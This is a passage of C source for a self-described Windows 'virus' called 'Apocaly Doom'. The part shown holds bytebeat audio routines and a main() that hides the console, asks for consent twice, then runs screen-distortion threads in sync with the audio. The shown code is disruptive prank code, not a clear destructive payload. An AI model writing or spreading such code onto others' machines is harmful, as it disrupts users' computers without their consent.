	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (0x9178ACCEED >> (t >> 8 & 31)) | t % 39 | t >> 8) + (t & 6765));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 7000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan((0x3bcf6 >> (((t >> 9) & 0x3980F)) & 0xFCF) * t | (~t >> 8)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 4000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * (42 & t >> 8) | (t * (42 & t >> 8) / 8 & 255));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t & 16384 ? 6 : 5) * (1 + (1 & t >> 1)) >> (1 & t >> 1)) | ((t * (t & 16384 ? 6 : 5) * (4 - (1 & t >> 8)) >> (3 & t >> 9)) | t >> 6) + ((t * t >> 8) / 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat14() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 3;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t) | t * rand());
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'Apocaly Doom'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Apocaly Doom.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"Apocaly Doom.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{

			CreateThread(0, 0, fe, 0, 0, 0);
			HANDLE thread0 = CreateThread(0, 0, drawapocalydoomicon, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1_num1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, tanwave1, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			TerminateThread(thread1_num2, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, screenrotate, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, rect, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			TerminateThread(thread2_num2, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, drawbytebeat1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			refreshscr();
			HANDLE thread4 = CreateThread(0, 0, shader2, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			refreshscr();
			HANDLE thread5_num1 = CreateThread(0, 0, gradientfillrect, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, screenHue, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			TerminateThread(thread5_num2, 0);
			refreshscr();
			HANDLE thread6 = CreateThread(0, 0, shader3, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6, 0);
			refreshscr();
			HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7, 0);
			refreshscr();
			HANDLE thread8_num1 = CreateThread(0, 0, flower1, 0, 0, 0);
			HANDLE thread8_num2 = CreateThread(0, 0, flower2, 0, 0, 0);
			HANDLE thread8_num3 = CreateThread(0, 0, flower3, 0, 0, 0);
			HANDLE thread8_num4 = CreateThread(0, 0, flower4, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8_num1, 0);
			TerminateThread(thread8_num2, 0);
			TerminateThread(thread8_num3, 0);
			TerminateThread(thread8_num4, 0);
			HANDLE thread9_num1 = CreateThread(0, 0, blur1, 0, 0, 0);
			HANDLE thread9_num2 = CreateThread(0, 0, texts, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9_num1, 0);
			TerminateThread(thread9_num2, 0);
			HANDLE thread10_num1 = CreateThread(0, 0, train, 0, 0, 0);
			HANDLE thread10_num2 = CreateThread(0, 0, sth, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10_num1, 0);
			TerminateThread(thread10_num2, 0);
			HANDLE thread11 = CreateThread(0, 0, shader5, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			refreshscr();
			HANDLE thread12_num1 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, rect1, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			TerminateThread(thread12_num2, 0);
			refreshscr();
			HANDLE thread13_num1 = CreateThread(0, 0, anyblt1, 0, 0, 0);
			HANDLE thread13_num2 = CreateThread(0, 0, anyblt2, 0, 0, 0);
			HANDLE thread13_num3 = CreateThread(0, 0, fastmoving, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13_num1, 0);
			TerminateThread(thread13_num2, 0);
			TerminateThread(thread13_num3, 0);
			refreshscr();
			HANDLE thread14 = CreateThread(0, 0, last, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14, 0);
			refreshscr();
			refreshscr();
			TerminateThread(thread0, 0);
		}
	}
	return 0;
}